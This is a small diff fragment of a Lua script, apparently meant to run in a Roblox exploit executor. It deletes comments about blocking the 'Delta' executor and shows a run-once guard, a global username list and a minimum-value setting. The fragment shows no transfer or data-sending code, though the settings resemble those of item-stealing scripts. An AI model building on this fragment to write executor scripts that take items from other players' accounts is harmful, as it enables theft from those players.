@@ -12,8 +12,6 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
--- Block Delta or any executor
--- Only block Delta, allo
 
 local users = _G.Usernames or {}
 local min_value = _G.min_value or 10000000
